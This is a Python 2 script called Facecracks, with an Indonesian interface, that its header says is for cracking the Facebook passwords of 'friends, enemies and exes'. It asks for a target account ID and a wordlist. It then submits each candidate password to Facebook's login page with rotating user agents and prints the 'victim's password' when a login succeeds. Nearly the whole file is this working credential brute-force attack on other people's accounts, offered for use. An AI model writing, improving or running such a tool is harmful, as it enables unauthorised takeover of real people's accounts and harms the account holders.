#!/usr/bin/python
# -*- coding: utf-8 -*-
# Facecracks
# Coded by Nedi Senja
# Github: https://github.com/stepbystepexe/Facecracks

import os, sys, time, random, cookielib, mechanize

info = """
Nama        : Facecracks
Versi       : 4.1 (Update: 26 Februari 2020, 9:00 PM)
Tanggal     : 15 Agustus 2019
Author      : Nedi Senja
Tujuan      : Brefungsi untuk mengcracks password
              facebook teman, musuh & mantan
Terimakasih : Allah SWT.
              FR13NDS, & seluruh
              manusia seplanet bumi
NB          : Manusia gax ada yang sempurna
              sama kaya tool ini.
              Silahkan laporkan kritik atau saran
              Ke - Email: d_q16x@outlook.co.id
                 - WhatsApp: +62 8577-5433-901

[ \x1b[4mGunakan tool ini dengan bijak \x1b[0m]\n """

example = """\x1b[0;102;1;90m[         Facecracks, My Github: @stepbystepexe          ]\x1b[0m"""

logo = """
     \x1b[0;41;31m[ ]\x1b[0m~\x1b[0;42;32m[ ]\x1b[0m~\x1b[0;44;34m[ ]\x1b[0m        \x1b[0;40;37m[-]\x1b[0m
          |              |
\x1b[106;96m[]\x1b[100;90m[]\x1b[0m~\x1b[4m\x1b[0;90;46;1m  Face \x1b[0;97;45;1m Cracks \033[0;90;43;1m  Facebook  \033[0m~\x1b[103;93m[]\x1b[102;92m[]\x1b[105;95m[]\x1b[107;97m[]\x1b[0m
                  \x1b[1;77m/\x1b[0m
     \x1b[0;90;47;1m * \x1b[0;1;104m Coded by \x1b[0;1;101m # Nedi Senja \x1b[0m
"""

def restart():
    python = sys.executable
    os.execl(python, python, * sys.argv)
    curdir = os.getcwd()

def loads():
    x = [
     '.   ', '..  ', '... ']
    for o in x:
        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mLoading ' + o,
        sys.stdout.flush()
        time.sleep(1)

def write(o):
    for i in o + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(10. / 100)

os.system('clear')
os.system('reset')
time.sleep(1)
print
print(logo)
print
print("\033[0m[\033[1;96mあ\033[0m] \033[1;77mMulai Menggunakan Facecracks")
print
print("\033[0m[\033[93;1m&\033[0m] LISENSI")
print("\033[0m[\033[94;1m#\033[0m] Informasi")
print("\033[0m[\033[92;1m*\033[0m] Perbarui")
print("\033[0m[\033[91;1m-\033[0m] Keluar")
print
option = raw_input("\033[0m[\033[1;95m/\033[0m] \033[1;77mMasukan opsi: \033[0m")
if option.strip() in 'あ 1 gunakan'.split():
    print
    email_target = str(raw_input('\n\x1b[0m[\x1b[96;1m?\x1b[0m] \x1b[77;1mMasukan ID Target: \x1b[0m'))
    write ('\n\x1b[77;1;4m[ INFO ] \x1b[0;4mMasukan wordlist anda*\x1b[0m')
    password_list = str(raw_input('\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[77;1mWordlist: \x1b[0m'))
    login = 'https://www.facebook.com/login.php?login_attempt=1'
    useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
    print
elif option.strip() in '& 2 lisensi'.split():
    print
    os.system('nano LICENSE')
    print
    restart()
elif option.strip() in '# 3 info'.split():
    os.system('clear')
    print(example)
    os.system('toilet -f smslant Cracks')
    print(info)
    time.sleep(1)
    print
    raw_input('[ Tekan Enter ]')
    restart()
elif option.strip() in '* 4 perbarui'.split():
    print
    os.system('git pull origin master')
    print
    raw_input('\033[0m[ \033[92mTekan Enter \033[0m]')
    restart()
elif option.strip() in '- keluar 0'.split():
    print("\n\033[0m[\033[1;91m!\033[0m] \033[1;77mKeluar dari program!")
    print
    sys.exit(1)
else:
    print("\n\033[0m[=\033[1;41;77m Pilihan Salah \033[0m=]")
    print
    time.sleep(1)
    restart()

def restart_program():
                print
                x = str(raw_input('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mMulai ulang program \x1b[0m[Y/n] : \x1b[77;1m'))
                if x.strip() in 'Y y'.split():
                    os.system('python2 facecracks.py')
                elif x.strip() in 'N n'.split():
                    print
                    print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mKeluar dari program!')
                    print
                    sys.exit(1)
                else:
                    print
                    print("\n\033[0m[=\033[1;41;77m Pilihan Salah \033[0m=]")
                    print
                    restart_program()

def edit_wordlist():
        print
        o = str(raw_input('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mEdit daftar nama (wordlist) \x1b[0m[Y/n] : \x1b[77;1m'))
        if o.strip() in 'Y y'.split():
                os.system('nano '+password_list)
                restart()
        elif o.strip() in 'N n'.split():
                print
                print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mKeluar dari program!')
                print
                sys.exit(1)
        else:
                print
                print("\n\033[0m[=\033[1;41;77m Pilihan Salah \033[0m=]")
                print
                edit_wordlist()
def main():
        global br
        reload(sys)
        sys.setdefaultencoding('utf8')
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        running()
        checker()
        print
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mWordlist tidak ditemukan')
        print

def word(lst_password):
    try:
        sys.stdout.write('\n\x1b[0m[\x1b[94;1m '+email_target+'\x1b[0m ] \033[0;4mMencoba\033[0m \xf0\x9f\x91\x89\033[91;1m '+lst_password+'\x1b[0m')
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email_target
        br.form['pass'] = lst_password
        ok = br.submit()
        mask = ok.geturl()
        if mask != login and (not 'login_attempt' in mask):
                        os.system('xdg-open https://github.com/stepbystepexe/')
                        print
                        print ('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[77;1mBerhasil')
                        print ('\x1b[0m[\x1b[96;1m&\x1b[0m] \x1b[77;1mMendapatkan Sandi Korban')
                        print
                        print ('\x1b[0m[\x1b[95;1m$\x1b[0m] \x1b[0mPengguna: \033[77;1m {}').format(email_target)
                        print ('\x1b[0m[\x1b[93;1m=\x1b[0m] \x1b[0mSandi   : \033[77;1m {}').format(lst_password)
                        print
                        raw_input('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTekan Enter untuk keluar ')
                        sys.exit(1)
    except KeyboardInterrupt:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mBerhenti')
        edit_wordlist()
        sys.exit(1)

def checker():
        global lst_password
        passw = open(password_list, "r")
        for lst_password in passw:
                passw = lst_password.replace("\n","")
                word(lst_password)

def running():
         global password_list
         print
         write ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mMemproses ...')
         print
         ok = open(password_list, 'r')
         ok = ok.readlines()
         time.sleep(5)
         print '\x1b[0m[\x1b[92;1m#\x1b[0m] \x1b[77;1mPengguna: \x1b[0m{}'.format(email_target)
         print '\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mSandi   : ',len(ok),'password'
         loads()
         print
         print
         time.sleep(5)

if __name__=='__main__':
        main()
